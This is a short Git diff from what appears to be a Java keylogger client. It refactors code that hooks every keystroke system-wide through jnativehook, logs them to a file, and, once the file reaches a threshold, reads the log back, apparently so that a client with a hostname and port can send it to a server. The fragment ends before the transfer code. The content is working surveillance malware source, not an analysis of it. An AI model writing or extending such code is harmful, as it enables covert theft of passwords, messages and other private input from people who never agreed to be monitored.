@@ -12,11 +12,11 @@ import java.util.logging.Logger;
 import org.jnativehook.GlobalScreen;
 
 import dev.source.connection.server.Server;
-import dev.source.logger.FileWriter;
+import dev.source.logger.FileManager;
 import dev.source.logger.KeyListener;
-import dev.source.utility.Commons;
 
 public class Client {
+	public static final short REQUIRED_FILE_SIZE_FOR_TRANSFER = 1;
 	private String hostname;
 	private int port;
 
@@ -32,8 +32,8 @@ public class Client {
 				KeyListener keyListener = new KeyListener()) {
 			GlobalScreen.registerNativeHook();
 			GlobalScreen.addNativeKeyListener(keyListener);
-			File logFile = new File(FileWriter.getInstance().getFileLocation());
-			if (logFile.exists() && logFile.length() >= Commons.REQUIRED_FILE_SIZE_FOR_TRANSFER) {
+			File logFile = new File(FileManager.getInstance().getFileLocation());
+			if (logFile.exists() && logFile.length() >= REQUIRED_FILE_SIZE_FOR_TRANSFER) {
 				try (BufferedReader reader = new BufferedReader(new FileReader(logFile))) {
 					String line;
 					while ((line = reader.readLine()) != null) {
